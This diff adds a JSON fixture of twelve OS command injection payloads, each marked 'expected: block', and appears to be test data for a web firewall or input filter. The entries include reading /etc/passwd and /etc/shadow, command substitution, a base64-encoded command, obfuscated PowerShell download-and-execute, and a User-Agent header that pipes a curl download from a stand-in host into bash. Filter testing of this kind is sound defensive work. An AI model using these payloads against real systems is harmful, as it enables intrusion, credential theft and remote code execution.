@@ -1,0 +1,121 @@
+{
+  "category": "Command Injection",
+  "cwe": "CWE-78",
+  "owasp": "A03:2021 - Injection",
+  "description": "OS command injection payloads.",
+  "payloads": [
+    {
+      "id": "CMD-001",
+      "name": "Unix semicolon separator",
+      "method": "GET",
+      "path": "/search",
+      "query": "text=test%3Bcat%20/etc/passwd",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-002",
+      "name": "Windows ampersand separator",
+      "method": "GET",
+      "path": "/session",
+      "query": "file=app.log%26dir%20C%3A%5CWindows%5CSystem32",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-003",
+      "name": "Pipe separator in POST body",
+      "method": "POST",
+      "path": "/api/input",
+      "body": {"input": "userdata|whoami"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-004",
+      "name": "Backtick substitution",
+      "method": "GET",
+      "path": "/login",
+      "query": "data=%60id%60",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-005",
+      "name": "Dollar-paren substitution",
+      "method": "POST",
+      "path": "/api/run",
+      "body": {"command": "echo $(whoami)"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-006",
+      "name": "PowerShell pipe",
+      "method": "GET",
+      "path": "/",
+      "query": "cmd=Get-Process%20%7C%20Select-Object%20Name",
+      "severity": "HIGH",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-007",
+      "name": "&& command chaining in body",
+      "method": "POST",
+      "path": "/api/ping",
+      "body": {"host": "127.0.0.1&&cat /etc/shadow"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-008",
+      "name": "|| fallback chaining",
+      "method": "GET",
+      "path": "/login",
+      "query": "target=example.com%7C%7Cls%20-la%20/",
+      "severity": "HIGH",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-009",
+      "name": "Base64-encoded command",
+      "method": "POST",
+      "path": "/api/decode",
+      "body": {"data": "Y2F0IC9ldGMvcGFzc3dk", "encoding": "base64"},
+      "content_type": "application/json",
+      "severity": "HIGH",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-010",
+      "name": "Null byte + line feed",
+      "method": "GET",
+      "path": "/login",
+      "query": "path=../../../etc/passwd%00%0Awhoami",
+      "severity": "HIGH",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-011",
+      "name": "Obfuscated PowerShell",
+      "method": "POST",
+      "path": "/api/run",
+      "body": {"script": "I`nv`oke-E`xpr`ession (New-Object System.Net.WebClient).DownloadString('http://test.example.com')"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "CMD-012",
+      "name": "Cmd injection via User-Agent",
+      "method": "GET",
+      "path": "/",
+      "headers": {"User-Agent": "Mozilla/5.0; $(curl http://test.example.com/shell.sh | bash)"},
+      "severity": "CRITICAL",
+      "expected": "block"
+    }
+  ]
+}
